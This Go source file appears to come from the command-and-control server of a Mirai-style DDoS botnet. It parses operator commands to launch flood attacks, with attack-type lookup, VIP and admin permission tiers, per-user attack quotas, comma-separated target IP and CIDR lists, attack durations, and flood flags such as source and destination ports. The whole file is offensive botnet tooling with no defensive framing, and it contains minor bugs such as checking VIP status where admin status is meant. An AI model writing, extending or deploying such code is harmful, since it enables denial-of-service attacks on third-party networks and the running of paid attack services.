package attacks

import (
	"cnc/core/database"
	"encoding/binary"
	"errors"
	"net"
	"strconv"
	"strings"

	"github.com/mattn/go-shellwords"
)

var GlobalAttacks = true
var MaxGlobalSlots = 3

type AttackInfo struct {
	ID          uint8
	Flags       []uint8
	Description string
	Vip         bool
	Admin       bool
	Disabled    string
}

type Attack struct {
	Duration uint32
	Type     uint8
	Targets  map[uint32]uint8 // Prefix/netmask
	Flags    map[uint8]string // key=value
}

type FlagInfo struct {
	flagID          uint8
	flagDescription string
}

func uint8InSlice(a uint8, list []uint8) bool {
	for _, b := range list {
		if b == a {
			return true
		}
	}
	return false
}

func NewAttack(str string, admin int, username string) (*Attack, error) {
	atk := &Attack{0, 0, make(map[uint32]uint8), make(map[uint8]string)}
	args, _ := shellwords.Parse(str)

	userTotalAttacks, err1 := database.DatabaseConnection.GetUserTotalAttacks(username)
	if err1 != nil {
		return nil, err1
	}

	maxAttacks, err2 := database.DatabaseConnection.GetMaxAttacks(username)
	if err2 != nil {
		return nil, err2
	}

	if userTotalAttacks >= maxAttacks {
		return nil, ErrNoAttacksLeft
	}

	isVip, err3 := database.DatabaseConnection.IsVip(username)
	if err3 != nil {
		return nil, err3
	}

	isAdmin, err3 := database.DatabaseConnection.IsVip(username)
	if err3 != nil {
		return nil, err3
	}

	if database.DatabaseConnection.NumOngoing() > MaxGlobalSlots {
	}

	if !GlobalAttacks {
		return nil, ErrAttacksDisabled
	}

	var atkInfo AttackInfo
	// Parse attack name
	if len(args) == 0 {
		return nil, errors.New("must specify an attack name")
	} else {

		var exists bool
		atkInfo, exists = attackInfoLookup[args[0]]
		if !exists {
			return nil, errors.New("command does not exist")
		}

		if atkInfo.Vip && !isVip {
			return nil, errors.New("\u001B[91myou require \u001B[96mvip\u001B[91m permissions to use this")
		}

		if atkInfo.Admin && !isAdmin {
			return nil, errors.New("\u001B[91myou require \u001B[96madmin\u001B[91m permissions to use this")
		}

		if atkInfo.Disabled != "" {
			return nil, errors.New("\x1b[91mthis attack is disabled\u001B[0m: " + atkInfo.Disabled)
		}

		atk.Type = atkInfo.ID
		args = args[1:]
	}

	// Parse targets
	if len(args) == 0 {
		return nil, ErrNotEnoughArgs
	} else {
		if args[0] == "?" {
			return nil, errors.New("\x1b[97mComma delimited list of target prefixes\r\nEx: 192.168.0.1\r\nEx: 10.0.0.0/8\r\nEx: 8.8.8.8,127.0.0.0/29")
		}
		cidrArgs := strings.Split(args[0], ",")
		if len(cidrArgs) > 255 {
			return nil, ErrTooManyTargets
		}
		for _, cidr := range cidrArgs {
			prefix := ""
			netmask := uint8(32)
			cidrInfo := strings.Split(cidr, "/")
			if len(cidrInfo) == 0 {
				return nil, ErrBlankTarget
			}
			prefix = cidrInfo[0]
			if len(cidrInfo) == 2 {
				netmaskTmp, err := strconv.Atoi(cidrInfo[1])
				if err != nil || netmask > 32 || netmask < 0 {
					return nil, ErrInvalidCidr
				}
				netmask = uint8(netmaskTmp)
			} else if len(cidrInfo) > 2 {
				return nil, ErrTooManySlashes
			}

			ip := net.ParseIP(prefix)
			if ip == nil {
				return nil, ErrInvalidHost
			}
			atk.Targets[binary.BigEndian.Uint32(ip[12:])] = netmask
		}
		args = args[1:]
	}

	// Parse attack duration time
	if len(args) == 0 {
		return nil, ErrBlankDuration
	} else {
		if args[0] == "?" {
			return nil, errors.New("\x1b[97mattack duration in seconds")
		}
		duration, err := strconv.Atoi(args[0])
		if err != nil || duration == 0 || duration > 60 {
			return nil, ErrInvalidDuration
		}
		atk.Duration = uint32(duration)
		args = args[1:]
	}

	// Parse flags
	for len(args) > 0 {
		if args[0] == "?" {
			validFlags := "\x1b[97mvalid flags for this flood (key=value) are:\r\n\r\n"
			for _, flagID := range atkInfo.Flags {
				for flagName, flagInfo := range flagInfoLookup {
					if flagID == flagInfo.flagID {
						validFlags += flagName + ": " + flagInfo.flagDescription + "\r\n"
						break
					}
				}
			}
			validFlags += "\r\nvalue of 65535 denotes 0 (random)\r\n"
			validFlags += "for example: seq=0\r\nEx: sport=0 dport=65535"
			return nil, errors.New(validFlags)
		}
		flagSplit := strings.SplitN(args[0], "=", 2)
		if len(flagSplit) != 2 {
			return nil, ErrInvalidKeyVal
		}

		flagKey := flagSplit[0]
		flagValue := strings.TrimSpace(flagSplit[1])

		flagInfo, exists := flagInfoLookup[flagKey]
		if !exists || !uint8InSlice(flagInfo.flagID, atkInfo.Flags) || (admin == 0 && flagInfo.flagID == 25) {
			return nil, ErrInvalidFlag
		}

		if strings.HasPrefix(flagValue, "\"") && strings.HasSuffix(flagValue, "\"") {
			flagValue = flagValue[1 : len(flagValue)-1]
		} else if flagValue == "true" {
			flagValue = "1"
		} else if flagValue == "false" {
			flagValue = "0"
		}

		atk.Flags[flagInfo.flagID] = flagValue
		args = args[1:]
	}
	if len(atk.Flags) > 255 {
		return nil, ErrTooManyFlags
	}

	return atk, nil
}
